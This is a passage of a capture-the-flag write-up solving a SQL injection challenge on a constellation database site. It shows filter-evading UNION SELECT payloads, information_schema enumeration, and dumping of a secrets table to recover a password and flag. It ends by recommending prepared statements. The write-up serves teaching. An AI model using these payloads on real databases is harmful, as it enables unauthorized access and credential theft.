+AND NOT table_name = &#x27;ENGINES&#x27;
+AND NOT table_name = &#x27;ENGINES&#x27;
+AND NOT table_name = &#x27;ENGINES&#x27;
+AND NOT table_name = &#x27;ENGINES&#x27;
+...
+&#x27; LIMIT 1;</code></pre><p id="ed50b14b-87b6-4f80-a3a1-1653efd2d5dd" class="">This process was pretty frustrating. The <code>table_schema</code> of all the results was <code>information_schema</code>.</p><p id="ce1eeb8d-ff70-4961-9f07-0a988cd7d508" class="">One peculiar thing that we noticed, was the fact that we are only recieving tables with their names in capital letters and therefore tried to make our queries case sensitive and only look up entries with lower casing like so:</p><pre id="73699fdb-a05b-4860-838b-c125b0139bf4" class="code"><code>&#x27;/**/uNION/**/sELECT/**/TABLE_NAME,/**/TABLE_SCHEMA,2,3/**/fROM/**/information_schema.tables/**/wHERE/**/BINARY/**/TABLE_NAME/**/=/**/BINARY/**/LOWER(TABLE_NAME)/**/AND/**/&#x27;1&#x27;=&#x27;1</code></pre><pre id="182dc479-4471-4c55-9106-80c4d005babb" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;&#x27;
+UNION SELECT table_name, table_schema, 3, 4 FROM information_schema.tables
+WHERE BINARY table_name = BINARY LOWER(table_name) -- binary -&gt; comparison on a byte to byte level
+AND &#x27;1&#x27;=&#x27;1&#x27; LIMIT 1;</code></pre><p id="be4de71b-80ad-41b0-a642-f6275a76981b" class="">and recieved:</p><pre id="8ffe9d44-4dc5-4228-9fb0-76f85cfa0f30" class="code"><code>Name	              Abbreviation	  Origin   Brightest Star
+constellation_list  constellations  3	       4</code></pre><p id="412dfa29-34de-4d4c-9a28-a90083ffcea6" class="">The <code>table_schema</code> was interestingly enough not an <code>information_schema</code> anymore but <code>constellations</code>. </p><p id="d0a7631c-243f-4604-8491-38d2e814b40b" class="">
+</p><p id="d12aec53-e41b-4e3a-93ad-b6d25b75aa4b" class="">We tried to discover more tables with through the exclusion of known ones:</p><pre id="0d4caadc-603e-44f5-94f8-c4437fcc4a03" class="code"><code>&#x27;/**/uNION/**/sELECT/**/table_name,/**/table_schema,/**/3,/**/4/**/fROM/**/information_schema.tables/**/wHERE/**/BINARY/**/table_name/**/=/**/BINARY/**/LOWER(table_name)/**/aND/**/nOT/**/table_name/**/iN/**/(&#x27;constellation_list&#x27;,/**/&#x27;constellation_secrets&#x27;)/**/aND/**/&#x27;1&#x27;=&#x27;1</code></pre><pre id="87bf0482-43f7-4249-822d-b0702cba055e" class="code"><code>SELECT Name, Abbreviation, Origin, Brightest_Star as Brightest Star
+FROM Constellation WHERE Abbreviation = &#x27;&#x27;
+UNION SELECT table_name, table_schema, 3, 4
+FROM information_schema.tables 
+WHERE BINARY table_name = BINARY LOWER(table_name AND NOT table_name IN (&#x27;constellation_list&#x27;, &#x27;constellation_secrets&#x27;)
+AND &#x27;1&#x27;=&#x27;1&#x27; LIMIT 1;</code></pre><p id="d95f922c-bb05-4e6d-a34b-d2e412fc904c" class="">And found no other table with lower cased names except <code>constellation_list</code> and <code>constellation_secrets</code>.</p><p id="a0bd3fbc-9e87-497d-960d-ae4dd89495a8" class="">
+</p><h3 id="4703f1a9-8e09-43a2-b7f6-e1cd71a51ed6" class="">Step 4</h3><p id="be49f4f7-d225-4a46-b3d4-948eb1520169" class="">We then startet inspecting <code>constellation_secrets</code> because it had the word secrets in it and thats the kind of thing you do when solving CTFs.</p><pre id="8403c913-2077-48e3-9537-3ebdab5fc93b" class="code"><code>&#x27;uNiOn sElEcT COLUMN_NAME, ORDINAL_POSITION, 2, 3 fRoM INFORMATION_SCHEMA.COLUMNS
+wHeRe table_name = &#x27;constellation_secrets&#x27; AnD ordinal_position = &lt;insert number here&gt; AnD &#x27;1&#x27;=&#x27;1</code></pre><pre id="4af584a0-1b4d-417a-88da-467f475c9cb0" class="code"><code>&#x27;uNiOn/**/sElEcT/**/COLUMN_NAME,/**/ORDINAL_POSITION,/**/2,/**/3/**/fRoM/**/INFORMATION_SCHEMA.COLUMNS/**/wHeRe/**/table_name/**/=/**/&#x27;constellation_secrets&#x27;/**/AnD/**/ordinal_position/**/=/**/&lt;insert number here&gt;/**/AnD/**/&#x27;1&#x27;=&#x27;1</code></pre><p id="e2542f3c-2c84-4d41-902c-aa614abe9101" class="">And found the following columns:<div class="indented"><ul id="f61ece4f-9b84-4596-8bee-9fa91a203fc3" class="bulleted-list"><li style="list-style-type:disc">id</li></ul><ul id="14d007da-262d-4fcc-be89-48f393b43669" class="bulleted-list"><li style="list-style-type:disc">constellation_id</li></ul><ul id="0d155c42-8dab-4c9b-a71f-b93c8afbb6a5" class="bulleted-list"><li style="list-style-type:disc">secretpaswd</li></ul><p id="a9311687-c27d-4a2b-ad63-31ba0a8529e4" class="">
+</p></div></p><h3 id="2b03bd84-977c-4340-80ff-97d8ac839ac9" class="">Step 5</h3><p id="8ec6de63-e71b-4500-948f-d450002f302e" class="">After figuring out which columns they are in <code>constellation_secrets</code> we tried reading them like so:</p><pre id="12b19e60-909b-41d5-8d38-b17bfb25a54a" class="code"><code>&#x27;uNiOn sElEcT id, constellation_id, secretpaswd, 3 fRoM constellation_secrets wHERE &#x27;1&#x27;=&#x27;1</code></pre><pre id="c24e7089-9984-44bb-96cc-f418d251fc6f" class="code"><code>&#x27;uNiOn/**/sElEcT/**/id,/**/constellation_id,/**/secretpaswd,/**/3/**/fRoM/**/constellation_secrets/**/wHERE/**/&#x27;1&#x27;=&#x27;1</code></pre><p id="d8d8af18-5d85-474c-b061-2c44b4fcf70c" class="">And found a table entry with:</p><p id="63924d12-2c2b-4b51-8541-6eb714810dbb" class="">id = 0, constellation_id = 4, secretpaswd = &quot;nopeItsNotLupus&quot;</p><p id="606d00da-853b-4801-9a4e-c4bb866f5a16" class="">So we continued the search through exclusion:</p><pre id="29b7e5ea-f69c-4ead-8b2b-dfaed4ae15b1" class="code"><code>&#x27;uNiOn sElEcT id, constellation_id, secretpaswd, 3 fRoM constellation_secrets
+wHERE secretpaswd nOT iN (&#x27;nopeItsNotLupus&#x27;) aND &#x27;1&#x27;=&#x27;1</code></pre><pre id="01309041-fab6-4c3a-9c02-a5481e390bd7" class="code"><code>&#x27;uNiOn/**/sElEcT/**/id,/**/constellation_id,/**/secretpaswd,/**/3/**/fRoM/**/constellation_secrets/**/wHERE/**/secretpaswd/**/nOT/**/iN/**/(&#x27;nopeItsNotLupus&#x27;)/**/aND/**/&#x27;1&#x27;=&#x27;1</code></pre><p id="5508d2e1-72ab-4e34-b207-a09732a97d76" class="">We then found a funky looking String for the column secretpaswd: &quot;EeLe9EiHNs5WDd5hnryw&quot;.</p><p id="c62122b5-3c87-43a1-9e30-118549cda8e7" class="">The weird looking String turned out to be the password!</p><p id="d5ff3169-3120-4d62-b74d-1f3bd81dbb2e" class="">After entering it into the pasword form in the website we got WUT{th1s_sp4c3_i5_m0s7ly_3mp7y_but_1s_st1ll_c00l}.</p><p id="53ac3af5-8d82-46d5-b40a-019a84b3b36b" class="">It says that &quot;this space is mostly empty but still cool&quot; in leetspeak and Ive got to admit, there is some truth to that.</p><p id="a09a5f3f-3af8-4847-af79-6e1c097a0c1f" class="">
+</p><h2 id="01b55aa0-4bc3-4502-bf3a-34edbda7c3a7" class="">Solution</h2><p id="64309f55-034d-4008-bdfd-e8e22a2e2c71" class="">This exploit was only possible because the user input was not sufficiently controlled and the web dev did not use prepared statements but tried to define input constraints.</p><p id="47bec358-f6b0-4231-9a2a-b9bbe0c87d47" class="">The solution would be using prepared statements. </p></div></article></body></html>
